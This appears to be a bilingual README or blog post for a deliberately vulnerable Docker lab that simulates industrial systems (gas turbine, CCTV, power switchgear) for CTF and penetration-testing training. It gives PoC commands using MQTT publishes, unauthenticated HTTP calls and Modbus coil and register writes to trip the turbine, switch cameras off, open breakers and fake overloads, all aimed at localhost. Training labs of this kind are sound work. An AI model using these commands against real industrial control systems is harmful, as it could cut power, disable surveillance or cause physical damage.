---
title: Sentinel 7 OT Security Simulator
published: 2025-11-16
description: OT Security Simulation for PenTest/Red Teaming
tags:
  - Home Labs
  - OT Security
category: Home Labs
draft: true
---

Github : https://github.com/netw0rk7/OT-Security-Simulation-Labs

# ENGLISH BELOW

# OT Security Simulator

**Sentinel 7 OT Security Simulator** - ห้องทดลองจำลองระบบอุตสาหกรรม (OT) สำหรับฝึก CTF / PenTest โดยไม่ต้องใช้ Hardware จริง รองรับโปรโตคอลสำคัญของ OT เช่น **Modbus, MQTT, OPC-UA, BACnet, RTSP/CCTV** พร้อมระบบ Dashboard สำหรับสังเกตการทำงานของระบบจำลอง โดยใช้ Telegraf - InfluxDB - Grafana

![Logo](https://github.com/user-attachments/assets/21320071-b9b1-482e-bba8-851891681059)

---

## สารบัญ

- Features
- Architecture
- Quickstart
- Services Address
- Configuration
- Services
- Grafana & Data flow
- CTF / PenTest — Scenarios & Flags
- Protocol & Port ที่สำคัญ
- ตัวอย่าง PoC / คำสั่งโจมตี
- การพัฒนาระบบเพิ่มเติม
- Safety & Ethics

---

# Features

- จำลองหลายโปรโตคอล OT: **Modbus/TCP**, **MQTT**, **OPC-UA**, **BACnet**, **RTSP (CCTV)**, **HTTP Web UI**
- Provision Grafana dashboards (pre-provisioned) และ Telegraf config
- รันทั้งหมดด้วย **Docker Compose** — เหมาะสำหรับ lab / training / CTF
- ตัวอย่าง PoC tools: `mbpoll`, `pymodbus`, `mosquitto_pub/sub`, `curl`, `jq`
- มีจุดที่เป็นช่องโหว่เพื่อใช้สำหรับการฝึกโจมตี (CTF-mode, writable registers, open MQTT topics)

---

# Architecture (Logical overview)

```
[ Attacker / Lab's Laptop ]
           |
        Docker Host
           |
   docker-compose network(s)
   ├─ mosquitto (MQTT)
   ├─ plc_modbus (Modbus TCP)
   ├─ opcua_server (OPC-UA)
   ├─ influxdb <- telegraf (รับข้อมูลจาก MQTT/OPC/Modbus)
   ├─ grafana (dashboards)
   ├─ HSL/RSTP/media server (CCTV)
   └─ cctv_control (Flask HTTP UI for camera/CTF)
```

---

# Quickstart (ติดตั้ง & รัน)

**Prerequisites**

- Docker & Docker Compose
-  เครื่องมือ: `mbpoll`, `pymodbus`, `mosquitto_pub`, `mosquitto_sub`, `curl`, `jq`

**การติดตั้งและรันระบบ**

```bash
1. Download on "Release"
2. Extract File

3. Start Docker Engine
# แก้ .env ถ้าต้องการเปลี่ยน Credential เข้าสู่ระบบ / InfluxDB token
docker compose up -d

# ตรวจสอบสถานะ container
docker compose ps
```

**Services Address**

- Grafana: `http://localhost:3000` (user: `admin` / password ตามที่ระบุไว้ใน `.env`)
- InfluxDB UI: `http://localhost:8086` (user: `admin` / password ตามที่ระบุไว้ใน `.env`)
- MQTT (Mosquitto): `localhost:1883`
- CCTV web UI (Flask): `http://localhost:5000/`
- OPC-UA: `opc.tcp://localhost:4840`
- Modbus : `localhost:1502` > container:502
- Access Control (Doorlock System) - **[IN-PROCESS]**
- Safety Interlock - **[IN-PROCESS]**
- SCADA/HMI: `http://localhost:8080/` - **[IN-PROCESS]**

---

# Configuration

- แก้ค่าภายใน `.env` (รหัสผ่าน Grafana, Influx token ฯลฯ) ก่อนรันบนเครื่องที่ตั้งเป็น Lab
- Port Mapping (ExternalPort:ContainerPort):
  - `1883:1883` — MQTT
  - `8086:8086` — InfluxDB
  - `3000:3000` — Grafana
  - `5000:5000` — CCTV control (HTTP)
  - `8554:8554` — CCTV control (RSTP)
  - `8888:8888` — CCTV control (HSL)
  - `4840:4840` — OPC-UA
  - `1502:502`  — Modbus
- ตรวจสอบ environment variables ได้ในไฟล์ `docker-compose.yml` และไฟล์ใน `services/*`

---

# Services

- `services/plc_modbus/` — Modbus TCP Server (pymodbus) จำลอง holding registers ของ Turbine/Power
- `services/turbine_core/` — ตัวจำลอง Gas Turbine (publishes MQTT, Updates OPC-UA)
- `services/opcua_server/` — OPC-UA Server ที่มี nodes สำหรับค่าของ Turbine
- `services/bacnet_sim/` — BACnet AHU Simulator (รับค่า HVAC จาก iot_sensors และทำให้มี protocol OT จริงให้เจาะ)
- `services/power_switchgear/` — Power Switchgear Simulator (Modbus) ชุดอุปกรณ์ควบคุมระบบไฟฟ้า (แสดงค่าทางไฟฟ้าของระบบแต่ละระบบภายในอาคาร)
- `services/iot_sensors/` — IoT Sensors Simulator (ใช้ป้อนค่า HVAC ambient/humidity/occupancy)
- `cctv_control/` — Flask Web UI สำหรับควบคุมกล้อง (CTF-mode มี flag ภายใน `state.json`)
- `grafana/` — Provisioning (Datasources/Dashboards)
- `telegraf/` — Config ของ Telegraf (Inputs: mqtt, opcua, modbus) เพื่อส่งค่าไป InfluxDB

---

# Services (ในระหว่างพัฒนา)

- `services/safety_interlock/` — Safety Interlock — Trip/Interlock ผ่าน MQTT + คุม Modbus **[IN-PROCESS]**
- `services/access_alarm/` — ระบบรักษาความปลอดภัยฝั่ง Physical **[IN-PROCESS]**
- `services/scada_hmi/` — ระบบส่วนกลางที่รวมข้อมูลจากอุปกรณ์ OT/IoT **[IN-PROCESS]**

---

# Grafana & Dataflow

- **Telegraf** ทำหน้าที่ดึงข้อมูลจาก:
  - `inputs.mqtt_consumer` — อ่าน telemetry จาก MQTT topics
  - `inputs.opcua` — poll OPC-UA nodes
  - `inputs.modbus` — poll Modbus registers
- ข้อมูลถูกเขียนเข้า **InfluxDB** ส่งออกไปยัง **Grafana** เพื่อแสดงบน Dashboards
- ตัวอย่าง Dashboards ใน `grafana/dashboards/`:
  - `ot-overview.json` — ภาพรวมระบบ OT (Gas Turbine, CCTV, Alert)
  - `building-ahu.json` — Dashboard ระบบ AHU
  - `building-power-modbus.json` — Power Panels

---

# CTF / PenTest — Scenarios

## Scenario 1 — Turbine Over Temperature/Over Speed

- Service: `MQTT` Port `1883`
- พฤติกรรม: หากอุณหภูมิ (Temperature) สูงกว่า 700 องศาเซลเซียส หรือรอบเครื่องผลิตกระแสไฟฟ้ามากกว่า 8000 รอบต่อนาที เกินว่า 5 วินาที ระบบจะหยุดการทำงาน

<img width="538" height="446" alt="sc1-1" src="https://github.com/user-attachments/assets/3574011e-5989-424e-8f9d-9f644a494e7a" />

**PoC**

```bash
#สั่ง Turbine เดินเครื่องด้วยกำลัง 100%
mosquitto_pub -h 127.0.0.1 -p 1883 -t "factory/turbine/cmd/thorttle" -m "100"
```

<img width="1078" height="811" alt="sc1-2" src="https://github.com/user-attachments/assets/ec893010-a0b2-4489-9947-435290a39293" />

```bash
#Reset Turbine ให้กลับมาทำงาน
mosquitto_pub -h 127.0.0.1 -p 1883 -t "factory/turbine/cmd/reset" -m "1"
```



## Scenario 2 — Camera Control [CTF Mode]

- บริการ: `cctv_control` (Flask) พอร์ต `5000`
- พฤติกรรม: ถ้าเปิด `INSECURE_POWER=1` ใน env จะสามารถส่ง API แบบไม่ต้องพิสูจน์ตัวตน (`/api/power/on`, `/api/power/off`) ที่ตอบกลับพร้อม `flag`
- Flag ถูกเก็บใน `cctv_control/state.json`

**PoC**

```bash
#สั่งปิดกล้องวงจรปิด
curl -s -X POST http://localhost:5000/api/power/off | jq .
```

<img width="1078" height="811" alt="sc1-2" src="https://github.com/user-attachments/assets/8d80ac38-2dc0-4c26-8cfe-daffb36bb4cf" />

<img width="522" height="520" alt="sc2-2" src="https://github.com/user-attachments/assets/fbbd539b-9123-4fee-b975-3958121571cb" />

```bash
#สั่งเปิดกล้องวงจรปิด
curl -s -X POST http://localhost:5000/api/power/on | jq .
```

<img width="509" height="147" alt="sc2-3" src="https://github.com/user-attachments/assets/6b82abec-35f4-4c6a-a127-35f586896659" />

<img width="521" height="525" alt="sc2-4" src="https://github.com/user-attachments/assets/eece316e-ede4-4c35-8be6-6ea02b9a2cca" />


## Scenario 3 — Camera Control [Secure Mode]

- บริการ: `cctv_control` (Flask) พอร์ต `5000`
- พฤติกรรม: ถ้าเปิด `INSECURE_POWER=0` ใน env จะไม่สามารถส่ง API แบบไม่พิสูจน์ตัวตนได้ จะต้องใช้ Credential ในการส่งคำสั่ง (`/api/power/on`, `/api/power/off`) แล้วจะตอบกลับพร้อม `flag`
- Flag ถูกเก็บใน `cctv_control/state.json`

**PoC**

```bash
#สั่งปิดกล้องวงจรปิด
curl -s -u admin:P@ssw0rd -X POST http://localhost:5000/api/power/off | jq .
```

<img width="660" height="138" alt="sc3-1" src="https://github.com/user-attachments/assets/4b24cc84-fa92-49bc-b90a-a15ab0e173a0" />

<img width="522" height="520" alt="sc3-2" src="https://github.com/user-attachments/assets/9850bdee-b8e6-4852-afc5-06fbdf95bb24" />

```bash
#สั่งเปิดกล้องวงจรปิด
curl -s -u admin:P@ssw0rd -X POST http://localhost:5000/api/power/on | jq .
```

<img width="652" height="148" alt="sc3-3" src="https://github.com/user-attachments/assets/f4e9293c-a6aa-47a8-bffa-eddccbd80c11" />

<img width="521" height="525" alt="sc3-4" src="https://github.com/user-attachments/assets/1802616d-9aec-4c3e-b669-1188a4e61601" />

## Scenario 4 — Power Cut-Off

- บริการ: `power_switchgear` (Modbus) พอร์ต `42001`
- พฤติกรรม: ถ้าเขียนค่า coil ทับ Breaker เพื่อปิดการทำงานได้ ไฟฟ้าระบบนั้น ๆ จะถูกตัด

**PoC**
```bash
-0 = ใช้ 0-based addressing
-a 1 = Modbus Slave ID = 1
-r <coil_number> = เลข coil (0=BRK1, 1=BRK2, … 7=BRK8)
-t 0 = Coil type
-p <port> = พอร์ต TCP (42001 ใน simulator)
<value> = 0 หรือ 1
```

```bash
#สั่งปิด Switchgear ของ Lighting ชั้น 1

mbpoll 127.0.0.1 -0 -a 1 -r 0 -1 -t 0 -p 42001 0

#-1 คือจำนวนรอบที่เขียนคำสั่ง
```

<img width="628" height="260" alt="sc4-1" src="https://github.com/user-attachments/assets/e4e9959d-576c-4e83-8eff-ec19bb816576" />

<img width="1618" height="821" alt="sc4-2" src="https://github.com/user-attachments/assets/f1deb2a9-b033-43ab-add2-e74fc908f605" />

```bash
#สั่งเปิด Switchgear ของ Lighting ชั้น 1

mbpoll 127.0.0.1 -0 -a 1 -r 0 -1 -t 0 -p 42001 1

```

<img width="630" height="268" alt="sc4-3" src="https://github.com/user-attachments/assets/b600ba31-253e-44ab-974a-f770b7f45f63" />

<img width="1616" height="825" alt="sc4-4" src="https://github.com/user-attachments/assets/ce304ddc-013c-47cd-9d66-1f2d18462654" />

## Scenario 5 — Power Overload

- บริการ: `power_switchgear` (Modbus) พอร์ต `42001`
- พฤติกรรม: ถ้าเขียนค่า coil ทับ Current เพื่อหลอกระบบ Switchgear ว่าไฟฟ้ามี Load เกิน จะทำให้ระบบตรวจพบ Overcurrent

**PoC**

```bash
#สั่งหลอกระบบว่ามีโหลดเกิน ของ Lighting ชั้น 1

mbpoll 127.0.0.1 -0 -a 1 -r 20 -1 -t 4:int -p 42001 999999

```

<img width="717" height="260" alt="sc5-1" src="https://github.com/user-attachments/assets/7e29525e-a8f1-41ea-9776-3a1c4d380b76" />

<img width="1605" height="815" alt="sc5-2" src="https://github.com/user-attachments/assets/5664b49f-90b9-4d4f-bf25-c93211d6dd63" />


# Protocol & Port ที่สำคัญ

**MQTT topics (turbine_core)**

```
factory/turbine/status
factory/turbine/telemetry/rpm
factory/turbine/telemetry/temp
factory/turbine/telemetry/vib
factory/turbine/telemetry/mw
alerts/turbine/failure
```

**Modbus (holding registers)**

| HR (0-based) | ชื่อ       |
|--------------|------------|
| 0-7          | แรงดันไฟฟ้า (V)|
| 20-27        | กระแสไฟฟ้า (A)|
| 40-47        | กำลังไฟฟ้า (kW)|
| 60-67        | พลังงานสะสม (kWh) |
| 100            | Alarm       |

**Modbus (coil)**

| CN (0-based) | ชื่อ       |
|--------------|------------|
| 0-7          | Breaker|

> หมายเหตุ: ปรับแต่ง implementation ได้ ตรวจสอบในไฟล์ `services/plc_modbus/app.py`

Type Table
| `-t`                          | หมายถึง                                 | ใช้กับ                                  |
| ----------------------------- | --------------------------------------- | --------------------------------------- |
| **-t 0**                      | Coil (บิต 1/0, R/W)                     | เบรกเกอร์, สวิตช์                       |
| **-t 1**                      | Discrete Input (บิต 1/0, Read Only)     | sensor on/off (ไม่ค่อยใช้ใน script นี้) |
| **-t 3\:int16** หรือ `uint16` | Input Register (16-bit word, Read Only) | ค่ามิเตอร์ที่อ่านได้อย่างเดียว          |
| **-t 4\:int16** หรือ `uint16` | Holding Register (16-bit word, R/W)     | ค่ามิเตอร์/ค่าที่ตั้งค่าได้             |

Mapping
| Index (0-based) | Type             | 1-based (Client Address) | Prefix แบบ Modbus | ความหมาย                |
| ---------------------- | ---------------- | ------------------------ | ----------------- | ----------------------- |
| 0                      | Coil             | -r 1                     | 00001             | เบรกเกอร์ Feeder 1      |
| 1                      | Coil             | -r 2                     | 00002             | เบรกเกอร์ Feeder 2      |
| 0                      | Holding Register | -r 1                     | 40001             | Voltage Feeder 1 (×10)  |
| 20                     | Holding Register | -r 21                    | 40021             | Current Feeder 1 (×100) |
| 40                     | Holding Register | -r 41                    | 40041             | Power Feeder 1 (×100)   |
| 60                     | Holding Register | -r 61                    | 40061             | Energy Feeder 1 (×10)   |
| 100                    | Holding Register | -r 101                   | 40101             | Alarm (0/1)             |

**OPC-UA nodes (ตัวอย่าง ns=2)**

- `Turbine.RPM`, `Turbine.TEMP`, `Turbine.VIB`, `Turbine.MW`, `Turbine.Trip`, `Turbine.Throttle`

---

# ตัวอย่าง PoC / คำสั่งโจมตี

1. อ่าน MQTT telemetry

```bash
mosquitto_sub -h 127.0.0.1 -t 'factory/turbine/telemetry/#' -v
```

2. ส่งค่า telemetry ปลอม (ทำให้เกิด alarm / trip)

```bash
mosquitto_pub -h 127.0.0.1 -t 'factory/turbine/cmd/throttle' -m '100'
#สั่งเร่งรอบเครื่องให้ทำงาน 100%
```

3. Reset Turbine (เริ่มการทำงาน Turbine ใหม่)

```bash
mosquitto_pub -h 127.0.0.1 -t 'factory/turbine/cmd/reset' -m '1'
```

4. เขียน Modbus register ด้วย `mbpoll`

```bash
#เขียน register ของ BRK1 เป็น 0 (ปิด Breaker)
mbpoll 127.0.0.1 -0 -a 1 -r 0 -1 -t 0 -p 42001 0

```

4. เปิดปิด CCTV ผ่าน API

```bash
curl -s -X POST http://127.0.0.1:5000/api/power/on | jq .
```

---

# การพัฒนาระบบเพิ่มเติม

- เพิ่ม service: สร้างโฟลเดอร์ใน `services/` พร้อม `Dockerfile` และเพิ่ม entry ใน `docker-compose.yml`
- เพิ่ม dashboards: วางไฟล์ JSON ใน `grafana/dashboards/` และปรับ provisioning
- สามารถเพิ่ม IDS/IPS/SIEM ได้ตามต้องการ
  
---

# Safety&Ethics

โปรเจกต์นี้มีช่องโหว่ตั้งใจให้ใช้เพื่อการฝึกเท่านั้น - **ห้าม** เชื่อมต่อคอนเทนเนอร์กับเครือข่ายโปรดักชันหรืออินเทอร์เน็ตสาธารณะโดยเด็ดขาด ใช้งานในเครือข่ายแยก (isolated / offline) เท่านั้น

---

# OT Security Simulator

**Sentinel 7 OT Security Simulator** – A fully simulated industrial OT environment for CTF / PenTest training without requiring real hardware. Supports **Modbus, MQTT, OPC-UA, BACnet, RTSP/CCTV**, with monitoring dashboards powered by Telegraf – InfluxDB – Grafana.

![Logo](https://github.com/user-attachments/assets/21320071-b9b1-482e-bba8-851891681059)

---

## Table of Contents

- Features  
- Architecture  
- Quickstart  
- Services Address  
- Configuration  
- Services  
- Grafana & Data Flow  
- CTF / PenTest — Scenarios & Flags  
- Important Protocols & Ports  
- Example PoC / Attack Commands  
- Further Development  
- Safety & Ethics  

---

# Features

- Simulates multiple OT protocols: **Modbus/TCP**, **MQTT**, **OPC-UA**, **BACnet**, **RTSP (CCTV)**, **HTTP Web UI**
- Pre‑provisioned Grafana dashboards and Telegraf configuration  
- Runs entirely via **Docker Compose** — perfect for labs / training / CTF  
- PoC tools included: `mbpoll`, `pymodbus`, `mosquitto_pub/sub`, `curl`, `jq`
- Contains intentionally vulnerable points for CTF mode (writable registers, open MQTT topics)

---

# Architecture (Logical overview)

```
[ Attacker / Lab's Laptop ]
           |
        Docker Host
           |
   docker-compose network(s)
   ├─ mosquitto (MQTT)
   ├─ plc_modbus (Modbus TCP)
   ├─ opcua_server (OPC-UA)
   ├─ influxdb <- telegraf (reads from MQTT/OPC/Modbus)
   ├─ grafana (dashboards)
   ├─ HSL/RTSP media server (CCTV)
   └─ cctv_control (Flask HTTP UI for camera/CTF)
```

---

# Quickstart

**Prerequisites**

- Docker & Docker Compose  
- Tools: `mbpoll`, `pymodbus`, `mosquitto_pub`, `mosquitto_sub`, `curl`, `jq`

**Install & Run**

```bash
1. Download on "Release"
2. Extract File

3. Start Docker Engine
# แก้ .env ถ้าต้องการเปลี่ยน Credential เข้าสู่ระบบ / InfluxDB token
docker compose up -d

# ตรวจสอบสถานะ container
docker compose ps
```

**Services Address**

- **Grafana:** `http://localhost:3000` (user: `admin` / password from `.env`)  
- **InfluxDB UI:** `http://localhost:8086`  
- **MQTT:** `localhost:1883`  
- **CCTV web UI:** `http://localhost:5000/`  
- **OPC-UA:** `opc.tcp://localhost:4840`  
- **Modbus:** `localhost:1502` → container:502  
- **Access Control System** — **[IN‑PROCESS]**  
- **Safety Interlock** — **[IN‑PROCESS]**  
- **SCADA/HMI:** `http://localhost:8080/` — **[IN‑PROCESS]**

---

# Configuration

Modify the `.env` file (Grafana passwords, InfluxDB token, etc.) before running this as a Lab system.

Port Mapping (External:Container):

```
1883:1883   — MQTT  
8086:8086   — InfluxDB  
3000:3000   — Grafana  
5000:5000   — CCTV Web Control  
8554:8554   — CCTV RTSP  
8888:8888   — CCTV HLS  
4840:4840   — OPC-UA  
1502:502    — Modbus  
```

Check environment variables in `docker-compose.yml` and under `services/*`.

---

# Services

- `services/plc_modbus/` — Modbus TCP Server (pymodbus) simulating Turbine/Power registers  
- `services/turbine_core/` — Gas Turbine simulator (publishes MQTT, updates OPC-UA)  
- `services/opcua_server/` — OPC-UA server with Turbine nodes  
- `services/bacnet_sim/` — BACnet AHU simulator  
- `services/power_switchgear/` — Power Switchgear (Modbus) simulator  
- `services/iot_sensors/` — IoT Sensor simulator providing HVAC values  
- `cctv_control/` — Flask Web UI for cameras (CTF mode; flags stored in `state.json`)  
- `grafana/` — Provisioned dashboards  
- `telegraf/` — Configured to read MQTT/OPC-UA/Modbus and forward to InfluxDB  

---

# Services (In Development)

- `services/safety_interlock/` — Safety interlock logic via MQTT + Modbus  
- `services/access_alarm/` — Physical security subsystem  
- `services/scada_hmi/` — Centralized SCADA dashboard  

---

# Grafana & Data Flow

**Telegraf** collects data from:

- `inputs.mqtt_consumer` — reads telemetry  
- `inputs.opcua` — polls OPC-UA nodes  
- `inputs.modbus` — polls Modbus registers  

Data is written into **InfluxDB**, then visualized through **Grafana**.

Dashboards (folder `grafana/dashboards/`):

- `ot-overview.json` — Global OT overview  
- `building-ahu.json` — AHU system  
- `building-power-modbus.json` — Power panel monitoring  

---

# CTF / PenTest — Scenarios

## Scenario 1 — Turbine Over Temperature / Over Speed

- Service: **MQTT** (`1883`)
- Behavior: If temperature > 700°C OR RPM > 8000 for more than 5 seconds → turbine trips.

**PoC**

```bash
mosquitto_pub -h 127.0.0.1 -p 1883 -t "factory/turbine/cmd/thorttle" -m "100"
```

Reset turbine:

```bash
mosquitto_pub -h 127.0.0.1 -p 1883 -t "factory/turbine/cmd/reset" -m "1"
```

---

## Scenario 2 — Camera Control [CTF Mode]

- Service: **Flask CCTV control**, port `5000`
- If `INSECURE_POWER=1` — unauthenticated API access:  
  `/api/power/on`, `/api/power/off`  
  → returns **flag** from `state.json`.

**PoC**

```bash
curl -s -X POST http://localhost:5000/api/power/off | jq .
```

---

## Scenario 3 — Camera Control [Secure Mode]

- If `INSECURE_POWER=0` — authentication required.

**PoC**

```bash
curl -s -u admin:P@ssw0rd -X POST http://localhost:5000/api/power/off | jq .
```

---

## Scenario 4 — Power Cut-Off (Modbus)

- Service: `power_switchgear`  
- Writing a coil turns breaker ON/OFF.

**PoC**

```bash
mbpoll 127.0.0.1 -0 -a 1 -r 0 -1 -t 0 -p 42001 0
```

---

## Scenario 5 — Power Overload (Modbus)

- Overwrite Current register to trigger Overcurrent alarm.

**PoC**

```bash
mbpoll 127.0.0.1 -0 -a 1 -r 20 -1 -t 4:int -p 42001 999999
```

---

# Important Protocols & Ports

## MQTT Topics (Turbine)

```
factory/turbine/status
factory/turbine/telemetry/rpm
factory/turbine/telemetry/temp
factory/turbine/telemetry/vib
factory/turbine/telemetry/mw
alerts/turbine/failure
```

## Modbus Holding Registers

| HR (0‑based) | Description |
|--------------|-------------|
| 0–7          | Voltage (V) |
| 20–27        | Current (A) |
| 40–47        | Power (kW) |
| 60–67        | Energy (kWh) |
| 100          | Alarm (0/1) |

## Modbus Coils

| CN | Description |
|----|-------------|
| 0–7 | Breakers |

## OPC-UA Nodes (ns=2)

`Turbine.RPM`, `Turbine.TEMP`, `Turbine.VIB`, `Turbine.MW`, `Turbine.Trip`, `Turbine.Throttle`

---

# Example PoC / Attack Commands

Read MQTT:

```bash
mosquitto_sub -h 127.0.0.1 -t 'factory/turbine/telemetry/#' -v
```

Fake telemetry:

```bash
mosquitto_pub -h 127.0.0.1 -t 'factory/turbine/cmd/throttle' -m '100'
```

Reset turbine:

```bash
mosquitto_pub -h 127.0.0.1 -t 'factory/turbine/cmd/reset' -m '1'
```

Toggle Modbus coil:

```bash
mbpoll 127.0.0.1 -0 -a 1 -r 0 -1 -t 0 -p 42001 0
```

CCTV API:

```bash
curl -s -X POST http://127.0.0.1:5000/api/power/on | jq .
```

---

# Further Development

- Add new service folders under `services/` with Dockerfile  
- Add new dashboards (JSON) under `grafana/dashboards/`  
- Can integrate IDS/IPS/SIEM

---

# Safety & Ethics

This project intentionally contains vulnerabilities for training.  
**Do NOT** connect it to production or public networks.  
Use only in isolated/offline environments.
